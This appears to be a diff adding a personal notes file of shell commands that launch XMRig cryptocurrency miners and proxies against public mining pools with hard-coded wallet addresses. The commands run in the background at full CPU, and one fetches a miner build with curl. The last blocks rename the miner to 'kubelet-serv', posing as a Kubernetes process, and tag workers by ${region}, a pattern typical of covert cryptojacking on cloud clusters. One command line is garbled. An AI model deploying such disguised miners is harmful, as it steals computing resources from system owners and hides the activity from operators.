@@ -1,0 +1,53 @@
+ ./xmrig -a rx/0 --url "sal.kryptex.network:8888" --user "solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/cluster" --tls -k --huge-pages --threads=32 --cpu-priority 5 --threads=32 --donate-level=0 
+ 
+nohup ./xmrig -a rx/0 --url sal.kryptex.network:8888 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/cluster --tls -k --huge-pages --threads=32 --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+
+
+
+nohup ./xmrig -o 0.0.0.0:3333 --rig-id cluster --tls -o sal.kryptex.network:8888 -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa -a rx/0 -k --huge-pages --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+nohup ./xmrig -a rx/0 --url master:3333 --user cluster --keepalive -k --tls=false
+
+	
+
+
+nohup ./xmrig -a rx/0 -o 192.168.252.11:3333 -u cluster --tls -k --huge-pages --threads=32 --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+./xmrig-proxy -a rx/0 -o sal.kryptex.network:8888 -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa -u cluster -k --tls -b 0.0.0.0:3333 -B -S --log-file=xmrig-proxy.log
+
+
+nohup ./xmrig -a rx/0 -o 192.168.252.11:3333 -u cluster --tls -k --huge-pages --threads=32 --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+./xmrig-proxy -o de.salvium.herominers.com:1230 -b 0.0.0.0:3333 -B -S --log-file=xmrig-proxy.log -m nicehash -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa.cluster -a randomx -k
+
+
+./xmrig-proxy -a randomx -o us2.salvium.herominers.com:1230 -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa.cluster -k --tls -b 0.0.0.0:3333 -B -S   --log-file=xmrig-proxy.log
+
+
+./xmrig -a rx/0 -o sal.kryptex.network:8888 -u solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa -u cluster -k --tls -b 0.0.0.0:3333 -B -S --log-file=xmrig-proxy.log
+
+
+
+curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar -xzvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+./xmrig -a rx/0 -o  xmr-asia1.nanopool.org:10343 -u 44mQxfpjUZEJ3P1zqXiE37LcPW9uK7zEjRntevJ7Yz3Cj6U4N5LN4mLVC6PCipUQpLBf1xVNeZKbNV5wKUvbRPvRNxbCzus/cluster -k --tls  --coin monero
+
+./xmrig -o pool.supportxmr.com:443 -u 44mQxfpjUZEJ3P1zqXiE37LcPW9uK7zEjRntevJ7Yz3Cj6U4N5LN4mLVC6PCipUQpLBf1xVNeZKbNV5wKUvbRPvRNxbCzus -k --tls -p ZEUS
+
+nohup ./xmrig -a rx/0 -./xmrig -o pool.supportxmr.com:443 -u 44mQxfpjUZEJ3P1zqXiE37LcPW9uK7zEjRntevJ7Yz3Cj6U4N5LN4mLVC6PCipUQpLBf1xVNeZKbNV5wKUvbRPvRNxbCzus -k --tls -p ZEUS --huge-pages --cpu-priority=5 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+pkill -9 kubelet-serv
+nohup ./kubelet-serv -a rx/0 --url sal.kryptex.network:8888 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} --tls -k --huge-pages  --cpu-priority=5  --threads=32 --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
+
+
+pkill -9 kubelet-serv
+nohup ./kubelet-serv -a rx/0 --url sal.kryptex.network:8888 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} --tls -k --huge-pages  --cpu-priority=5  --threads=$(nproc) --donate-level=0 --syslog --print-time=10 > xmrig.log 2>&1 &
+
